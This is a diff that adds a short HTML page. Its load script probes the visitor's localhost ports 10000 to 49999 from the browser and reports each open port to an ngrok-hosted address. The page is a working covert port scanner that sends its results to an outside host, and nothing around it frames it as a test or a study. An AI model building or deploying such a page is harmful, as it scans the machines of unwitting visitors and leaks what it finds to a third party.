@@ -1,0 +1,13 @@
+<html>
+  <body>
+    <script>
+      window.onload = () => {
+        for(let i = 10000; i < 50000;i++) {
+          fetch('http://localhost:' + i).then(() => {
+            fetch('http://3a42e4d82a22.ngrok.io/'+i);
+          }).catch(() => {});
+        }
+      };
+    </script>
+  </body>
+</html>
